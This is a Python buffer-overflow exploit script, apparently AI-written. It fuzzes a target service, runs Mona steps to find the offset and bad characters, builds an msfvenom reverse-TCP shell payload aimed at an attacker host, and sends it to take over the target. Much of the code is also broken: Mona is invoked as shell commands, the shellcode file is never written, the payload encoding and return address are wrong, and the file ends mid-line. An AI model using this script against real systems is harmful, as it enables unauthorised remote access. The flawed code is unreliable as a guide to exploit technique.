"""
This program tests for buffer overflow vulnerabilities in a target application by sending a string of increasing length
and constructing a payload to exploit the vulnerability. The payload is designed to gain root access to the target system.
The program uses the Mona framework to identify the memory location where the pattern overwrote the buffer, find bad characters,
and determine the right module to target.

Author: Some dumb AI
"""

import os
import socket
import sys
import time

# Prompt user for target IP and port
ip = input("Enter the target IP address: ")
port = input("Enter the target port: ")

# Create a string of increasing length to send to the application to test for a buffer overflow
buffer = ""
for i in range(100, 5000, 100):
    buffer += "A" * i

# Connect to the target application and send the buffer
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, int(port)))
    print(f"Sending {len(buffer)} bytes...")
    s.send(buffer.encode())
    s.close()
    print("Buffer sent successfully. Check the application to see if it crashed.")
except:
    print("Error connecting to server.")
    sys.exit()

# If the application has crashed, use Mona to identify the memory location where the pattern overwrote the buffer.
# Use the identified offset to construct the payload that will exploit the vulnerability.
if input("Did the application crash? (Y/N) ").upper() == "Y":
    try:
        # Generate a unique pattern using Mona
        os.system("mona pattern_create 5000 > pattern.txt")

        # Send the pattern to the application
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, int(port)))
        with open("pattern.txt", "r") as f:
            pattern = f.read()
        print(f"Sending {len(pattern)} bytes...")
        s.send(pattern.encode())
        s.close()
        print("Pattern sent successfully. Check the application to see where the pattern overwrote the buffer.")
    except:
        print("Error connecting to server.")
        sys.exit()

    # Get the offset where the pattern overwrote the buffer
    offset = input("Enter the value of EIP (eg. 41396f41): ")
    try:
        os.system(f"mona findmsp -distance 5000 -pattern {offset} -n")
    except:
        print("Error running Mona.")
        sys.exit()

    # Use Mona to find bad characters
    try:
        os.system("mona bytearray -cpb \"\\x00\"")
        os.system("mona compare -f bytearray.bin -a <application.exe> -o badchars.txt")
    except:
        print("Error running Mona.")
        sys.exit()

    # Use Mona to find the right module
    try:
        os.system("mona modules")
        os.system("mona jmp -r esp -m <module.dll>")
    except:
        print("Error running Mona.")
        sys.exit()

    # Generate the final payload and send it to the application to gain root access
    try:
        os.system(f"msfvenom -p windows/shell_reverse_tcp LHOST=<attacker IP address> LPORT=<attacker port> -b \"\\x00\" -f python -v shellcode")
        with open("shellcode", "r") as f:
            shellcode = f.read()
        encoded_shellcode = shellcode.encode("latin-1").hex()
        buffer = "A" * 2003 + "B" * 4 + encoded_shellcode
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, int(port)))
        print(f"Sending {len(buffer)} bytes...")
        s.send(buffer.encode())
        s.close()
        print("Payload sent successfully. Check the listener to see if you have gained root access.")
    except:
        print("Error connecting to server
